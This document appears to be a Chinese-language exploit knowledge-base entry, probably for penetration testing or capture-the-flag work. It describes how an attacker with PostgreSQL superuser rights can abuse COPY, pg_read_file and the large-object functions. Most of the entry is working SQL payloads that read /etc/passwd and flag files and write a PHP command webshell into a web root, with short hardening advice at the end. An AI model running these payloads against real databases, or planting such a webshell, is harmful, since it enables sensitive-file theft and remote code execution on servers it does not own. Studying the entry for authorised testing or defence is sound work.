---
id: POSTGRES-FILE-RW
title: "PostgreSQL - 文件读写操作"
product: postgres
vendor: PostgreSQL
version_affected: "all versions (misconfiguration)"
severity: HIGH
tags: [文件读写, copy, lo_import, lo_export, 需要认证]
fingerprint: ["PostgreSQL"]
---

## 漏洞描述

PostgreSQL 提供多种方式读写文件系统。`COPY` 命令可将文件内容导入表或将查询结果导出到文件；`pg_read_file()` 可直接读取文件；Large Object（lo_）系列函数支持二进制文件的导入导出。攻击者可利用这些功能读取敏感文件（如 /etc/passwd、flag）或写入 Webshell。

## 影响版本

- 所有版本（需要 superuser 权限或相关权限）

## 前置条件

- superuser 权限（COPY、pg_read_file）
- 对应文件路径有读写权限

## 利用步骤

### 读取文件

```sql
-- 方法 1: COPY 读取
CREATE TABLE file_content (line TEXT);
COPY file_content FROM '/etc/passwd';
SELECT * FROM file_content;
DROP TABLE file_content;

-- 方法 2: pg_read_file（superuser）
SELECT pg_read_file('/etc/passwd');

-- 方法 3: lo_ 函数读取二进制文件
SELECT lo_import('/etc/passwd', 12345);
SELECT encode(data, 'escape') FROM pg_largeobject WHERE loid = 12345;
SELECT lo_unlink(12345);
```

### 写入文件

```sql
-- 方法 1: COPY TO 写入
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- 方法 2: lo_ 写入二进制文件
SELECT lo_from_bytea(0, decode('3C3F70687020...', 'hex'));
SELECT lo_export(LAST_OID, '/var/www/html/shell.php');
```

## Payload

```sql
-- 快速读取 flag
CREATE TABLE f(c TEXT); COPY f FROM '/root/flag.txt'; SELECT * FROM f;

-- 写 webshell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

## 修复建议

1. 限制 superuser 权限的分配
2. 使用 pg_hba.conf 限制远程连接来源
3. 以低权限用户运行 PostgreSQL，限制文件系统访问
4. 监控异常的 COPY 和 lo_ 操作
5. 定期审计数据库活动日志
